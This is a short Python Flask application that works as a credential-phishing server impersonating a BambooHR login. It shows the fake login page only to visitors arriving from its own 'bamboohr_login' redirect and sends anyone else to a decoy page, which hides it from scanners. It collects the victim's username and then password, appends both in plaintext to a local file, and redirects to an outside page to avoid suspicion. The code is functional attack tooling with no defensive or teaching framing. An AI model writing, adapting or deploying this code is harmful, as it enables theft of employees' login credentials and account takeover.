from flask import Flask, request, redirect, url_for, render_template, jsonify

app = Flask(__name__)

@app.route('/bamboohr_login')
def bamboohr_login():
    return render_template('redirect.html')

@app.route('/login')
def login():
    referer = request.headers.get('Referer')
    print(referer)
    if referer and "bamboohr_login" in referer:
        return render_template('login.html')
    return redirect(url_for('just_a_site'))
    
@app.route('/justasite.html')
def just_a_site():
    return render_template('justasite.html')

@app.route('/submit_login', methods=['POST'])
def submit_login():
    user_login = request.form['user_login']
    with open('logins.txt', 'a') as file:
        file.write(user_login + "\n")
    return jsonify({"success": True, "message": "Please provide your password"})
    
@app.route('/submit_password', methods=['POST'])
def submit_password():
    user_password = request.form['user_password']
    with open('logins.txt', 'a') as file:
        file.write("Password: " + user_password + "\n")
    return redirect("https://originalpage.com/home/", code=302)

if __name__ == '__main__':
    app.run(debug=True)
